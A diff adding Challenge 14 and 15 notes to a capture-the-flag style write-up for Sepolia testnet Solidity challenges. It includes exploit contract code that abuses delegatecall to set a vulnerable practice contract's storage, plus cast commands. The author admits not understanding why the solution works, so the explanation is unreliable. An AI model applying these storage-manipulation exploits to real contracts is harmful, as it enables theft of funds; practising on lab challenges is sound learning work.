@@ -286,3 +286,116 @@ cast storage 0xaFa4150818b7843345A5E54E430Bd0cAE31B5c0C 0 --rpc-url $SEPOLIA_RPC
 - We get `572038313094850821099624258919152072749626292365`
 - Adding 10 to that value, our contract needs to return:
 `−572038313094850821099624258919152072749626291038`
+
+### [Challenge 14](https://sepolia.etherscan.io/address/0x46F3fE2C8aC9e9AE4DEDE1a7a29Ab3BdcFa7eaFc#code)
+- This challenge is self explanatory. Input whatever you want.
+
+### [Challenge 15](https://sepolia.etherscan.io/address/0x766a74f8924C7B07df088fDB0F7D7DbaDd330Fb3#code)
+```
+/*
+ * CALL THIS FUNCTION!
+ * 
+ * @param your exploit address
+ * @param the selector you want to use
+ * @param yourTwitterHandle - Your twitter handle. Can be a blank string.
+ */
+function solveChallenge(address yourAddress, bytes4 selector, string memory yourTwitterHandle) external {
+	if (OtherContract(yourAddress).getOwner() != msg.sender) {
+		revert CourseCompletedNFT__NotOwnerOfOtherContract();
+	}
+	bool returnedOne = i_vulnerableContract.callContract(yourAddress);
+	bool returnedTwo = i_vulnerableContract.callContractAgain(yourAddress, selector);
+
+	if (!returnedOne && !returnedTwo) {
+		revert CourseCompletedNFT__Nope();
+	}
+	_updateAndRewardSolver(yourTwitterHandle);
+}
+```
+- We need to create an exploit contract that's going to interact with a vulnerable contract
+- The interactions need to return two true booleans
+
+```
+interface OtherContract {
+    function getOwner() external returns (address);
+}
+```
+- Our exploit contract needs to have this function
+
+```
+contract VulnerableContract {
+    uint256 public s_variable = 0;
+    uint256 public s_otherVar = 0;
+
+    function callContract(address yourAddress) public returns (bool) {
+        (bool success,) = yourAddress.delegatecall(abi.encodeWithSignature("doSomething()"));
+        require(success);
+        if (s_variable != 123) {
+            revert VulnerableContract__NopeCall();
+        }
+        s_variable = 0;
+        return true;
+    }
+
+    function callContractAgain(address yourAddress, bytes4 selector) public returns (bool) {
+        s_otherVar = s_otherVar + 1;
+        (bool success,) = yourAddress.call(abi.encodeWithSelector(selector));
+        require(success);
+        if (s_otherVar == 2) {
+            return true;
+        }
+        s_otherVar = 0;
+        return false;
+    }
+}
+```
+- The first function in the `Vulnerable` contract makes a delegatecall to our `ExploitContract`
+- The second function makes a regular call
+- Our `ExploitContact` needs a function called `doSomething()` and a second function for which we need the selector 
+
+- I don't understand how this challenge works. 
+- In my first attempt, I used the first function in my contract to set both variables
+```
+function doSomething() external {
+	s_variable += 123;
+	s_otherVar += 1;
+}  
+```
+- But this didn't work
+
+- What ended up working was setting `s_otherVar` in the second function:
+```
+function doSomething() external {
+	s_variable += 123;
+}
+
+function doSomethingAgain() external {
+	s_otherVar = 2;
+}
+```
+- I'm not sure why this works, and chatgpt couldn't give me a clear answer either
+- A possible bug could be state pollution during the first delegatecall?
+
+#### How i got there
+
+```
+cast call 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D \
+ "callContract(address)" "0x766a74f8924C7B07df088fDB0F7D7DbaDd330Fb3"
+```
+- nothing burger
+
+```
+ function doSomethingAgain() external {
+
+        (bool success, ) = msg.sender.delegatecall(abi.encodeWithSignature("callContractAgain(address, bytes4)", address(this), bytes4(keccak256("setSOtherVar()"))));
+
+        require(success);
+
+    }
+```
+
+- We can use cast to get the function signature for our second function
+```
+$ cast sig "doSomethingAgain()"
+0xbcb030c8
+```
